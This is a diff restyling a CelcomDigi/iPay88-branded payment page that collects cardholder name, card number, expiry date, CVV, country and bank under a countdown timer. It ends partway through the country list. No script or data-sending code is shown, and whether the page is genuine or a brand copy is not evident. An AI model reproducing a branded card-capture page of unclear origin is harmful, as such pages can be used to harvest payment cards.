@@ -2,628 +2,675 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>CelcomDigi Next Gen App iPay88</title>
   <link rel="stylesheet" href="/get-assets/css/ngpay.normalize.css">
-  <link rel="stylesheet" href="/get-assets/css/ngpay.webflow-base.css">
-  <link rel="stylesheet" href="/get-assets/css/ngpay.webflow.css">
-  <link href="https://fonts.googleapis.com/css?family=Lato:100,100italic,300,300italic,400,400italic,700,700italic,900,900italic%7CMontserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
+    *, *::before, *::after { box-sizing: border-box; }
+
     :root {
-      --bright-blue-500: #1568e1;
-      --bright-blue-50: #b3ccf8;
-      --white: #fff;
+      --blue-dark: #001870;
+      --blue-main: #1568e1;
+      --blue-light: #b3ccf8;
+      --yellow: #ffe000;
+      --white: #ffffff;
       --black: #101828;
       --gray-50: #f9fafb;
       --gray-300: #d0d5dd;
       --gray-500: #667085;
     }
 
-    /* gradient header */
-    .cd-master.gradient-blue {
-      background-image: linear-gradient(to bottom, #001870 11%, var(--bright-blue-500) 30%, white 30%);
-    }
-    .cd-master.gradient-blue.for-overlap {
-      background-image: none;
-      background-color: white;
+    html, body {
+      margin: 0;
+      padding: 0;
+      min-height: 100%;
+      font-family: Lato, sans-serif;
+      background: #fff;
     }
 
-    /* nav */
-    .cd-nav-wrapper {
-      max-width: 800px;
-      margin: 0 auto;
-      padding: 16px 5%;
-    }
-    .cd-nav-content {
-      width: 100%;
+    /* ── PAGE WRAPPER ── */
+    .page-wrapper {
+      min-height: 100vh;
       display: flex;
-      justify-content: space-between;
-      align-items: center;
+      flex-direction: column;
     }
-    .cd-nav-link-wrapper {
-      width: 100%;
+
+    /* ── HEADER (blue gradient) ── */
+    .header-bg {
+      background: linear-gradient(180deg, var(--blue-dark) 0%, var(--blue-main) 100%);
+      padding: 16px 20px 0;
+    }
+
+    .nav-row {
       display: flex;
-      justify-content: space-between;
       align-items: center;
+      margin-bottom: 12px;
     }
-    .cd-nav-link {
+
+    .back-btn {
       background: none;
       border: none;
       cursor: pointer;
       padding: 0;
-    }
-    .cd-nav-icon { width: 24px; height: 24px; }
-
-    /* logo */
-    .logo {
-      width: 23%;
-      margin: 8px auto 32px;
-      display: block;
-    }
-
-    /* section */
-    .cd-section {
-      max-width: 800px;
-      margin-left: auto;
-      margin-right: auto;
-      padding-left: 5%;
-      padding-right: 5%;
-    }
-    .cd-section.margin-bot { margin-bottom: 48px; }
-    .cd-section.margin-bot.drop-shadow {
-      filter: drop-shadow(0px 0px 8px rgba(102,102,102,0.16));
-    }
-    .cd-section.padding-top { padding-top: 16px; }
-    .cd-section.padding-top.full-width {
-      width: 100%;
-      text-align: center;
-      border-bottom: 1px solid #eaecf0;
-      padding-top: 32px;
-      box-sizing: border-box;
-    }
-    .cd-section.full-height { padding-bottom: 120px; }
-
-    /* summary card */
-    .cd-summary-wrapper {
-      background-color: var(--white);
-      border-radius: 24px 24px 0 0;
-      flex-direction: column;
-      padding: 0 32px;
       display: flex;
-      gap: 24px;
-      position: relative;
+      align-items: center;
     }
-    .cd-timeout-wrapper {
-      z-index: 1;
-      background-color: #ffe000;
-      border-radius: 20px;
+
+    .back-btn img {
+      width: 24px;
+      height: 24px;
+    }
+
+    .logo-wrap {
       display: flex;
       justify-content: center;
-      align-items: center;
-      margin-left: 39%;
-      padding: 4px 10px;
+      padding: 0 0 24px;
+    }
+
+    .logo-wrap img {
+      width: 140px;
+    }
+
+    /* ── SUMMARY CARD ── */
+    .summary-card {
+      background: #fff;
+      border-radius: 20px 20px 0 0;
+      margin: 0 16px;
+      padding: 32px 20px 0;
+      position: relative;
+      box-shadow: 0 -4px 16px rgba(0,0,0,0.08);
+    }
+
+    .timeout-badge {
       position: absolute;
-      top: -16px;
-      box-shadow: 0 0 8px rgba(0,0,0,.15);
-    }
-    .cd-h2 {
-      color: var(--black);
-      margin: 0 0 24px;
-      font-family: Montserrat, sans-serif;
-      font-size: 24px;
-      line-height: 32px;
-    }
-    .cd-paragraph { color: var(--gray-500); font-size: 16px; line-height: 26px; }
-    .cd-paragraph.blue-500 { color: var(--black); }
-    .cd-paragraph.align-middle { color: var(--gray-500); text-align: center; }
-    .cd-text-row { display: flex; flex-direction: column; gap: 4px; }
-    .cd-paragraph-value {
-      color: var(--black);
+      top: -14px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: var(--yellow);
+      border-radius: 20px;
+      padding: 4px 16px;
       font-family: Lato, sans-serif;
-      font-size: 16px;
-      font-weight: 400;
-      line-height: 26px;
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--black);
+      white-space: nowrap;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.15);
     }
-    .cd-paragraph-value.price {
-      color: #000;
+
+    .summary-title {
       text-align: center;
       font-family: Montserrat, sans-serif;
-      font-size: 32px;
+      font-size: 18px;
       font-weight: 700;
-      line-height: 40px;
+      color: var(--black);
+      margin: 0 0 16px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--gray-300);
     }
 
-    /* wavy divider */
-    .div-block {
-      height: 75px;
+    .summary-amount-label {
+      text-align: center;
+      color: var(--gray-500);
+      font-size: 13px;
+      margin: 0 0 4px;
+    }
+
+    .summary-amount-value {
+      text-align: center;
+      font-family: Montserrat, sans-serif;
+      font-size: 28px;
+      font-weight: 700;
+      color: var(--black);
+      margin: 0 0 16px;
+    }
+
+    .summary-row {
+      margin-bottom: 12px;
+    }
+
+    .summary-row-label {
+      color: var(--gray-500);
+      font-size: 13px;
+      margin: 0 0 2px;
+    }
+
+    .summary-row-value {
+      color: var(--black);
+      font-size: 15px;
+      font-weight: 400;
+      margin: 0;
+      word-break: break-word;
+    }
+
+    /* ── WAVY DIVIDER ── */
+    .wave-divider {
+      height: 36px;
       background-image: url('/get-assets/images/Group-220.svg');
-      background-position: 50% 0;
+      background-position: center top;
       background-repeat: no-repeat;
       background-size: cover;
-      margin-top: -2px;
+      margin: 12px 0 0;
     }
 
-    /* form */
-    .cd-form-wrapper { padding-bottom: 48px; }
+    /* ── CONTENT AREA (white) ── */
+    .content-area {
+      background: #fff;
+      flex: 1;
+      padding: 0 20px 40px;
+    }
+
+    /* ── CARD DETAILS FORM ── */
+    .section-title {
+      font-family: Montserrat, sans-serif;
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--black);
+      margin: 24px 0 20px;
+    }
+
     .form {
       display: flex;
       flex-direction: column;
-      gap: 24px;
+      gap: 16px;
     }
-    .cd-input-row { position: relative; }
-    .cd-input-row.two-col {
-      display: flex;
-      gap: 24px;
+
+    /* floating label input */
+    .input-wrap {
+      position: relative;
     }
-    .cd-input-row.margin-bot { margin-bottom: 48px; }
-    .cd-input-row.margin-bot.gray {
-      border: 1px solid var(--gray-300);
-      background-color: var(--gray-50);
-      border-radius: 12px;
-      padding: 16px 16px 14px;
-    }
-    .cd-input-row.for-hide { display: none; }
-    .cd-input-wrapper { flex: 1; position: relative; }
-    .cd-input-label {
-      color: var(--gray-500);
-      font-size: 12px;
-      font-weight: 400;
-      line-height: 12px;
-      transition: all .2s;
+
+    .float-label {
       position: absolute;
-      top: 8px;
       left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--gray-500);
+      font-size: 15px;
+      font-family: Lato, sans-serif;
       pointer-events: none;
+      transition: all 0.15s ease;
       z-index: 1;
     }
-    .cd-input-label.idle {
-      font-size: 16px;
-      line-height: 32px;
-      top: 18px;
+
+    .float-label.active {
+      top: 10px;
+      transform: none;
+      font-size: 11px;
+      line-height: 1;
     }
-    .cd-text-field {
-      height: 68px;
-      border: 1px solid var(--gray-300);
-      color: var(--black);
-      border-radius: 12px;
-      margin-bottom: 0;
-      padding: 24px 16px 8px;
-      font-size: 16px;
-      line-height: 32px;
+
+    .text-field {
       width: 100%;
-      box-sizing: border-box;
+      height: 60px;
+      border: 1px solid var(--gray-300);
+      border-radius: 12px;
+      padding: 22px 16px 8px;
+      font-size: 15px;
       font-family: Lato, sans-serif;
+      color: var(--black);
       background: #fff;
       outline: none;
+      appearance: none;
     }
-    .cd-text-field:focus { border-color: var(--bright-blue-500); }
-    .cd-selection {
-      height: 68px;
-      border: 1px solid var(--gray-300);
-      background-color: var(--white);
-      color: var(--gray-500);
-      border-radius: 12px;
-      margin-bottom: 0;
-      padding: 8px 40px 8px 16px;
-      font-size: 16px;
-      line-height: 32px;
+
+    .text-field:focus {
+      border-color: var(--blue-main);
+    }
+
+    /* two-col row */
+    .two-col {
+      display: flex;
+      gap: 12px;
+    }
+
+    .two-col .input-wrap {
+      flex: 1;
+    }
+
+    /* select */
+    .select-field {
       width: 100%;
-      box-sizing: border-box;
+      height: 60px;
+      border: 1px solid var(--gray-300);
+      border-radius: 12px;
+      padding: 0 40px 0 16px;
+      font-size: 15px;
       font-family: Lato, sans-serif;
+      color: var(--gray-500);
+      background: #fff url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23667085' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E") no-repeat right 14px center;
       appearance: none;
       -webkit-appearance: none;
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23667085' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
-      background-repeat: no-repeat;
-      background-position: right 16px center;
-      cursor: pointer;
       outline: none;
+      cursor: pointer;
     }
-    .cd-selection:focus { border-color: var(--bright-blue-500); }
+
+    .select-field:focus {
+      border-color: var(--blue-main);
+    }
+
+    .hidden-row {
+      display: none;
+    }
 
     /* checkbox */
-    .w-checkbox.cd-checkbox-field {
+    .checkbox-wrap {
+      border: 1px solid var(--gray-300);
+      border-radius: 12px;
+      background: var(--gray-50);
+      padding: 14px 16px;
       display: flex;
       align-items: flex-start;
+      gap: 10px;
       cursor: pointer;
-      padding: 0;
-      margin: 0;
     }
-    .cd-checkbox {
+
+    .checkbox-input {
       width: 18px;
       height: 18px;
-      margin-top: 6px;
       flex-shrink: 0;
+      margin-top: 2px;
       appearance: none;
       -webkit-appearance: none;
       border: 1.5px solid var(--gray-300);
       border-radius: 4px;
       background: #fff;
       cursor: pointer;
-      transition: all 0.2s;
       position: relative;
+      transition: all 0.15s;
     }
-    .cd-checkbox:checked {
-      background: var(--bright-blue-500);
-      border-color: var(--bright-blue-500);
+
+    .checkbox-input:checked {
+      background: var(--blue-main);
+      border-color: var(--blue-main);
     }
-    .cd-checkbox:checked::after {
+
+    .checkbox-input:checked::after {
       content: '';
       position: absolute;
       left: 4px;
       top: 1px;
-      width: 7px;
-      height: 11px;
+      width: 6px;
+      height: 10px;
       border: 2px solid #fff;
       border-top: none;
       border-left: none;
       transform: rotate(45deg);
     }
-    .cd-checkbox-label {
+
+    .checkbox-label {
+      font-size: 13px;
+      line-height: 1.6;
       color: var(--black);
-      margin-left: 8px;
-      font-size: 16px;
-      line-height: 32px;
     }
-    .link {
-      color: var(--bright-blue-500);
+
+    .privacy-link {
+      color: var(--blue-main);
       text-decoration: none;
     }
-    .link:hover { text-decoration: underline; }
 
     /* buttons */
-    .cd-button-row { flex: 1; margin-bottom: 16px; }
-    .cd-button {
+    .btn-proceed {
       width: 100%;
-      background-color: var(--bright-blue-500);
-      color: var(--white);
-      border-radius: 50px;
-      padding: 16px;
-      font-size: 18px;
-      font-weight: 400;
-      line-height: 24px;
-      display: block;
+      height: 54px;
+      background: var(--blue-main);
+      color: #fff;
       border: none;
-      cursor: pointer;
+      border-radius: 50px;
       font-family: Montserrat, sans-serif;
-      text-align: center;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
       transition: opacity 0.2s;
+      margin-top: 4px;
     }
-    .cd-button:hover { opacity: 0.9; }
-    .cd-button.disable {
-      background-color: var(--bright-blue-50);
+
+    .btn-proceed:hover { opacity: 0.9; }
+
+    .btn-proceed.disabled {
+      background: var(--blue-light);
       cursor: not-allowed;
       pointer-events: none;
     }
-    .cd-button.padding-left-right.outline {
-      border: 1px solid var(--gray-300);
-      background-color: var(--white);
-      color: var(--black);
-    }
-    .cd-button.padding-left-right.outline:hover { background-color: var(--gray-50); }
 
-    /* responsive */
-    @media screen and (max-width: 767px) {
-      .cd-section { max-width: none; padding-left: 4%; padding-right: 4%; }
-      .cd-section.margin-bot { margin-bottom: 32px; }
-      .cd-h2 { margin-bottom: 16px; font-size: 18px; line-height: 22px; }
-      .cd-summary-wrapper { gap: 16px; padding: 16px; }
-      .cd-paragraph, .cd-paragraph.blue-500 { font-size: 14px; line-height: 18px; }
-      .cd-paragraph-value { font-size: 16px; line-height: 20px; }
-      .cd-paragraph-value.price { font-size: 24px; line-height: 32px; }
-      .cd-input-label { font-size: 10px; line-height: 10px; }
-      .cd-input-label.idle { font-size: 14px; line-height: 18px; }
-      .cd-text-field { height: 54px; }
-      .cd-selection { height: 54px; padding-left: 12px; font-size: 14px; line-height: 18px; }
-      .cd-checkbox-label { max-width: 97%; margin-left: 12px; font-size: 14px; line-height: 18px; }
-      .cd-checkbox { width: 20px; height: 20px; margin-top: 0; }
-      .cd-button { font-size: 16px; }
-      .div-block { height: 47px; }
-      .logo { width: 30%; }
+    .btn-cancel {
+      width: 100%;
+      height: 54px;
+      background: #fff;
+      color: var(--black);
+      border: 1px solid var(--gray-300);
+      border-radius: 50px;
+      font-family: Montserrat, sans-serif;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 4px;
     }
-    @media screen and (max-width: 479px) {
-      .cd-section { padding-left: 5%; padding-right: 5%; }
-      .cd-timeout-wrapper { margin-left: 29%; }
-      .cd-checkbox-label { max-width: 100%; margin-left: 10px; }
-      .cd-checkbox { width: 18px; height: 18px; }
-      .div-block { height: 32px; }
-      .logo { width: 41%; }
+
+    .btn-cancel:hover { background: var(--gray-50); }
+
+    /* ── DESKTOP adjustments ── */
+    @media (min-width: 600px) {
+      .header-bg { padding: 20px 0 0; }
+
+      .nav-row {
+        max-width: 480px;
+        margin: 0 auto 12px;
+        padding: 0 20px;
+      }
+
+      .logo-wrap { padding-bottom: 28px; }
+      .logo-wrap img { width: 160px; }
+
+      .summary-card {
+        max-width: 480px;
+        margin: 0 auto;
+        border-radius: 24px 24px 0 0;
+        padding: 36px 32px 0;
+      }
+
+      .wave-divider {
+        max-width: 480px;
+        margin: 12px auto 0;
+        height: 48px;
+      }
+
+      .content-area {
+        max-width: 480px;
+        margin: 0 auto;
+        padding: 0 32px 60px;
+        width: 100%;
+      }
+
+      .summary-title { font-size: 22px; }
+      .summary-amount-value { font-size: 32px; }
+      .section-title { font-size: 22px; }
+
+      .text-field { height: 68px; font-size: 16px; }
+      .float-label { font-size: 16px; }
+      .float-label.active { font-size: 12px; }
+      .select-field { height: 68px; font-size: 16px; }
+      .btn-proceed, .btn-cancel { height: 58px; font-size: 18px; }
     }
-    body { padding-bottom: 0; }
   </style>
 </head>
 <body>
 
-<!-- Blue gradient header -->
-<div class="cd-master gradient-blue">
-  <div class="cd-nav-wrapper">
-    <div class="cd-nav-content">
-      <div class="cd-nav-link-wrapper">
-        <button class="cd-nav-link w-inline-block" onclick="history.back()">
-          <img alt="Back" class="cd-nav-icon" loading="lazy" src="/get-assets/images/arrow-narrow-left.svg">
-        </button>
-      </div>
+<div class="page-wrapper">
+
+  <!-- Blue header -->
+  <div class="header-bg">
+    <div class="nav-row">
+      <button class="back-btn" onclick="history.back()">
+        <img src="/get-assets/images/arrow-narrow-left.svg" alt="Back">
+      </button>
+    </div>
+    <div class="logo-wrap">
+      <img src="/get-assets/images/ngpay-logo.svg" alt="CelcomDigi">
     </div>
   </div>
-  <div class="cd-section">
-    <img alt="CelcomDigi" class="logo" loading="lazy" src="/get-assets/images/ngpay-logo.svg">
-  </div>
-</div>
 
-<!-- Summary card overlapping -->
-<div class="cd-master gradient-blue for-overlap">
-  <div class="cd-section margin-bot drop-shadow for-overlap">
-    <div class="cd-summary-wrapper">
-      <div class="cd-timeout-wrapper">
-        <div class="cd-paragraph blue-500">Timeout: <span id="the-final-countdown">08:00</span></div>
-      </div>
-      <div class="cd-section padding-top full-width">
-        <h2 class="cd-h2">Summary of transaction</h2>
-      </div>
-      <div class="cd-text-row">
-        <div class="cd-paragraph align-middle">Net charges</div>
-        <div class="cd-paragraph-value price" id="displayAmount">MYR 0.00</div>
-      </div>
-      <div class="cd-text-row">
-        <div class="cd-paragraph">Pay to</div>
-        <div class="cd-paragraph-value">CelcomDigi Telecommunications Sdn Bhd</div>
-      </div>
-      <div class="cd-text-row">
-        <div class="cd-paragraph">Payment of</div>
-        <div class="cd-paragraph-value" id="paymentOf">RM 0 Bill Payment for -</div>
-      </div>
-      <div class="cd-text-row">
-        <div class="cd-paragraph">Reference no. / Payment ID</div>
-        <div class="cd-paragraph-value" id="refNo">-</div>
-      </div>
+  <!-- Summary card (overlaps header) -->
+  <div class="summary-card">
+    <div class="timeout-badge">Timeout: <span id="countdown">08:00</span></div>
+
+    <div class="summary-title">Summary of transaction</div>
+
+    <div class="summary-amount-label">Net charges</div>
+    <div class="summary-amount-value" id="displayAmount">MYR 0.00</div>
+
+    <div class="summary-row">
+      <div class="summary-row-label">Pay to</div>
+      <div class="summary-row-value">CelcomDigi Telecommunications Sdn Bhd</div>
     </div>
-    <div class="div-block"></div>
+
+    <div class="summary-row">
+      <div class="summary-row-label">Payment of</div>
+      <div class="summary-row-value" id="paymentOf">RM 0 Bill Payment for -</div>
+    </div>
+
+    <div class="summary-row">
+      <div class="summary-row-label">Reference no. / Payment ID</div>
+      <div class="summary-row-value" id="refNo">-</div>
+    </div>
+
+    <div class="wave-divider"></div>
   </div>
 
-  <!-- Card details -->
-  <div class="cd-section full-height">
-    <h2 class="cd-h2">Card details</h2>
-    <div class="cd-form-wrapper">
-      <div class="w-form">
-        <form id="wf-form-Card-Details" autocomplete="off" class="form" name="CC" onsubmit="return false;">
+  <!-- White content area -->
+  <div class="content-area">
+    <div class="section-title">Card details</div>
 
-          <!-- Cardholder name -->
-          <div class="cd-input-row">
-            <div class="cd-input-wrapper">
-              <label for="Cardholder-Name" class="cd-input-label idle">Cardholder name</label>
-              <input class="cd-text-field w-input" maxlength="35" name="CCName" value="" placeholder="" type="text" id="Cardholder-Name" required oninput="validateForm()">
-            </div>
-          </div>
+    <form id="cardForm" autocomplete="off" class="form" onsubmit="return false;">
 
-          <!-- Card number -->
-          <div class="cd-input-row">
-            <div class="cd-input-wrapper">
-              <label for="CCNo" class="cd-input-label idle">Credit / Debit card number</label>
-              <input class="cd-text-field w-input" maxlength="19" name="CCNo" placeholder="" type="text" id="CCNo" oninput="formatCardNumber(this); validateForm();">
-            </div>
-          </div>
-
-          <!-- Expiry + CVV -->
-          <div class="cd-input-row two-col">
-            <div class="cd-input-wrapper">
-              <label for="ExpiryDate" class="cd-input-label idle">Expiry date (MM/YY)</label>
-              <input id="ExpiryDate" type="tel" class="cd-text-field w-input" placeholder="" maxlength="5" required oninput="formatExpiry(this); validateForm();">
-            </div>
-            <div class="cd-input-wrapper">
-              <label for="CVV" class="cd-input-label idle">CVC/CVV2</label>
-              <input class="cd-text-field w-input" maxlength="4" name="CVV" placeholder="" type="password" id="CVV" required oninput="validateForm()">
-            </div>
-          </div>
-
-          <!-- Country -->
-          <div class="cd-input-row">
-            <select name="CCCountry" id="CCCountry" class="cd-selection w-select" onchange="validateForm()">
-              <option value="">Select Country</option>
-              <option value="AU">Australia</option>
-              <option value="AT">Austria</option>
-              <option value="AZ">Azerbaijan</option>
-              <option value="BS">Bahamas</option>
-              <option value="BH">Bahrain</option>
-              <option value="BD">Bangladesh</option>
-              <option value="BE">Belgium</option>
-              <option value="BZ">Belize</option>
-              <option value="BO">Bolivia</option>
-              <option value="BA">Bosnia And Herzegowina</option>
-              <option value="BW">Botswana</option>
-              <option value="BR">Brazil</option>
-              <option value="BN">Brunei Darussalam</option>
-              <option value="BG">Bulgaria</option>
-              <option value="KH">Cambodia</option>
-              <option value="CM">Cameroon</option>
-              <option value="CA">Canada</option>
-              <option value="KY">Cayman Islands</option>
-              <option value="CL">Chile</option>
-              <option value="CN">China</option>
-              <option value="CO">Colombia</option>
-              <option value="CR">Costa Rica</option>
-              <option value="HR">Croatia (Local Name: Hrvatska)</option>
-              <option value="CU">Cuba</option>
-              <option value="CY">Cyprus</option>
-              <option value="CZ">Czech Republic</option>
-              <option value="DK">Denmark</option>
-              <option value="DO">Dominican Republic</option>
-              <option value="EC">Ecuador</option>
-              <option value="EG">Egypt</option>
-              <option value="SV">El Salvador</option>
-              <option value="EE">Estonia</option>
-              <option value="ET">Ethiopia</option>
-              <option value="FJ">Fiji</option>
-              <option value="FI">Finland</option>
-              <option value="FR">France</option>
-              <option value="GA">Gabon</option>
-              <option value="GE">Georgia</option>
-              <option value="DE">Germany</option>
-              <option value="GH">Ghana</option>
-              <option value="GR">Greece</option>
-              <option value="GT">Guatemala</option>
-              <option value="GN">Guinea</option>
-              <option value="GY">Guyana</option>
-              <option value="HT">Haiti</option>
-              <option value="HN">Honduras</option>
-              <option value="HK">Hong Kong</option>
-              <option value="HU">Hungary</option>
-              <option value="IN">India</option>
-              <option value="ID">Indonesia</option>
-              <option value="IQ">Iraq</option>
-              <option value="IE">Ireland</option>
-              <option value="IL">Israel</option>
-              <option value="IT">Italy</option>
-              <option value="JM">Jamaica</option>
-              <option value="JP">Japan</option>
-              <option value="JO">Jordan</option>
-              <option value="KZ">Kazakhstan</option>
-              <option value="KE">Kenya</option>
-              <option value="KW">Kuwait</option>
-              <option value="LA">Lao People'S Dem Republic</option>
-              <option value="LV">Latvia</option>
-              <option value="LB">Lebanon</option>
-              <option value="LT">Lithuania</option>
-              <option value="LU">Luxembourg</option>
-              <option value="MO">Macau</option>
-              <option value="MK">Macedonia</option>
-              <option value="MG">Madagascar</option>
-              <option value="MW">Malawi</option>
-              <option value="MY" selected>Malaysia</option>
-              <option value="MV">Maldives</option>
-              <option value="ML">Mali</option>
-              <option value="MT">Malta</option>
-              <option value="MR">Mauritania</option>
-              <option value="MU">Mauritius</option>
-              <option value="MX">Mexico</option>
-              <option value="MD">Moldova, Republic Of</option>
-              <option value="MC">Monaco</option>
-              <option value="MN">Mongolia</option>
-              <option value="MA">Morocco</option>
-              <option value="MZ">Mozambique</option>
-              <option value="MM">Myanmar</option>
-              <option value="NA">Namibia</option>
-              <option value="NP">Nepal</option>
-              <option value="NL">Netherlands</option>
-              <option value="NZ">New Zealand</option>
-              <option value="NI">Nicaragua</option>
-              <option value="NE">Niger</option>
-              <option value="NG">Nigeria</option>
-              <option value="NO">Norway</option>
-              <option value="OM">Oman</option>
-              <option value="PK">Pakistan</option>
-              <option value="PA">Panama</option>
-              <option value="PG">Papua New Guinea</option>
-              <option value="PY">Paraguay</option>
-              <option value="PE">Peru</option>
-              <option value="PH">Philippines</option>
-              <option value="PL">Poland</option>
-              <option value="PT">Portugal</option>
-              <option value="PR">Puerto Rico</option>
-              <option value="QA">Qatar</option>
-              <option value="RO">Romania</option>
-              <option value="RU">Russian Federation</option>
-              <option value="RW">Rwanda</option>
-              <option value="SA">Saudi Arabia</option>
-              <option value="SN">Senegal</option>
-              <option value="SC">Seychelles</option>
-              <option value="SL">Sierra Leone</option>
-              <option value="SG">Singapore</option>
-              <option value="SK">Slovakia (Slovak Republic)</option>
-              <option value="SI">Slovenia</option>
-              <option value="SO">Somalia</option>
-              <option value="ZA">South Africa</option>
-              <option value="ES">Spain</option>
-              <option value="LK">Sri Lanka</option>
-              <option value="SD">Sudan</option>
-              <option value="SR">Suriname</option>
-              <option value="SE">Sweden</option>
-              <option value="CH">Switzerland</option>
-              <option value="SY">Syrian Arab Republic</option>
-              <option value="TW">Taiwan</option>
-              <option value="TJ">Tajikistan</option>
-              <option value="TZ">Tanzania, United Republic Of</option>
-              <option value="TH">Thailand</option>
-              <option value="TG">Togo</option>
-              <option value="TO">Tonga</option>
-              <option value="TT">Trinidad And Tobago</option>
-              <option value="TN">Tunisia</option>
-              <option value="TR">Turkey</option>
-              <option value="TM">Turkmenistan</option>
-              <option value="UG">Uganda</option>
-              <option value="UA">Ukraine</option>
-              <option value="AE">United Arab Emirates</option>
-              <option value="GB">United Kingdom</option>
-              <option value="US">United States</option>
-              <option value="UY">Uruguay</option>
-              <option value="UZ">Uzbekistan</option>
-              <option value="VU">Vanuatu</option>
-              <option value="VE">Venezuela</option>
-              <option value="VN">Viet Nam</option>
-              <option value="YE">Yemen</option>
-              <option value="ZM">Zambia</option>
-              <option value="ZW">Zimbabwe</option>
-            </select>
-          </div>
-
-          <!-- Bank -->
-          <div class="cd-input-row">
-            <select name="CCBank" id="CCBank" class="cd-selection w-select" onchange="validateForm()">
-              <option value="">Please Select</option>
-              <option value="AEON">AEON</option>
-              <option value="AFFIN">Affin Bank</option>
-              <option value="AGRO">Agro bank</option>
-              <option value="ALRAJHI">Al Rajhi</option>
-              <option value="ALLIANCE">Alliance Bank</option>
-              <option value="AMBANK">AmBank</option>
-              <option value="BANK_ISLAM">Bank Islam</option>
-              <option value="BANK_MUAMALAT">Bank Muamalat</option>
-              <option value="BSN">Bank Simpanan</option>
-              <option value="BCB">BCB Community Bank</option>
-              <option value="BIGPAY">BigPay</option>
-              <option value="BSN2">BSN</option>
-              <option value="CIMB">CIMB</option>
-              <option value="CITIBANK">Citibank</option>
-              <option value="HONGLEONG">Hong Leong Bank</option>
-              <option value="HSBC">HSBC Bank</option>
-              <option value="MAYBANK">Maybank</option>
-              <option value="MBF">MBF</option>
-              <option value="OCBC">OCBC</option>
-              <option value="PUBLIC">Public Bank</option>
-              <option value="RHB">Rhb Bank</option>
-              <option value="SCB">Standard Chartered Bank</option>
-              <option value="UOB">United Overseas Bank</option>
-              <option value="OTHER">Other</option>
-            </select>
-          </div>
-
-          <!-- Other bank (hidden) -->
-          <div id="Other-Bank-Row" class="cd-input-row for-hide">
-            <div class="cd-input-wrapper">
-              <label for="Other-Bank" class="cd-input-label idle">Others bank name</label>
-              <input class="cd-text-field w-input" maxlength="256" name="CCBankother" placeholder="" type="text" id="Other-Bank">
-            </div>
-          </div>
-
-          <!-- Authorization checkbox -->
-          <div class="cd-input-row margin-bot gray">
-            <label class="w-checkbox cd-checkbox-field">
-              <input type="checkbox" id="AcceptTC" name="AcceptTC" class="w-checkbox-input cd-checkbox" onchange="validateForm()">
-              <span class="cd-checkbox-label w-form-label">I authorize Digi Telecommunications Sdn Bhd to debit the above net charges from my credit / debit card and I have read &amp; agreed to <a href="https://my.nttdatapay.com/privacy-notice" target="_blank" class="link">our Privacy Statement</a>.</span>
-            </label>
-          </div>
-
-          <!-- Proceed button -->
-          <div class="cd-button-row">
-            <input type="button" onclick="handleProceed()" class="cd-button w-button disable" id="proceed" name="Submit" value="Proceed">
-          </div>
-
-          <!-- Cancel button -->
-          <div class="cd-button-row">
-            <input type="button" onclick="handleCancel()" class="cd-button padding-left-right outline w-button" name="Cancel" value="Cancel">
-          </div>
-
-        </form>
+      <!-- Cardholder name -->
+      <div class="input-wrap">
+        <label class="float-label" for="CCName">Cardholder name</label>
+        <input class="text-field" type="text" id="CCName" name="CCName" maxlength="35"
+               oninput="validateForm()" onfocus="floatUp(this)" onblur="floatDown(this)">
       </div>
-    </div>
+
+      <!-- Card number -->
+      <div class="input-wrap">
+        <label class="float-label" for="CCNo">Credit / Debit card number</label>
+        <input class="text-field" type="tel" id="CCNo" name="CCNo" maxlength="19"
+               oninput="formatCard(this); validateForm()" onfocus="floatUp(this)" onblur="floatDown(this)">
+      </div>
+
+      <!-- Expiry + CVV -->
+      <div class="two-col">
+        <div class="input-wrap">
+          <label class="float-label" for="ExpiryDate">Expiry date (MM/YY)</label>
+          <input class="text-field" type="tel" id="ExpiryDate" name="ExpiryDate" maxlength="5"
+                 oninput="formatExpiry(this); validateForm()" onfocus="floatUp(this)" onblur="floatDown(this)">
+        </div>
+        <div class="input-wrap">
+          <label class="float-label" for="CVV">CVC/CVV2</label>
+          <input class="text-field" type="password" id="CVV" name="CVV" maxlength="4"
+                 oninput="validateForm()" onfocus="floatUp(this)" onblur="floatDown(this)">
+        </div>
+      </div>
+
+      <!-- Country -->
+      <select class="select-field" id="CCCountry" name="CCCountry" onchange="validateForm()">
+        <option value="">Select Country</option>
+        <option value="AU">Australia</option>
+        <option value="AT">Austria</option>
+        <option value="AZ">Azerbaijan</option>
+        <option value="BS">Bahamas</option>
+        <option value="BH">Bahrain</option>
+        <option value="BD">Bangladesh</option>
+        <option value="BE">Belgium</option>
+        <option value="BZ">Belize</option>
+        <option value="BO">Bolivia</option>
+        <option value="BA">Bosnia And Herzegowina</option>
+        <option value="BW">Botswana</option>
+        <option value="BR">Brazil</option>
+        <option value="BN">Brunei Darussalam</option>
+        <option value="BG">Bulgaria</option>
+        <option value="KH">Cambodia</option>
+        <option value="CM">Cameroon</option>
+        <option value="CA">Canada</option>
+        <option value="KY">Cayman Islands</option>
+        <option value="CL">Chile</option>
+        <option value="CN">China</option>
+        <option value="CO">Colombia</option>
+        <option value="CR">Costa Rica</option>
+        <option value="HR">Croatia (Local Name: Hrvatska)</option>
+        <option value="CU">Cuba</option>
+        <option value="CY">Cyprus</option>
+        <option value="CZ">Czech Republic</option>
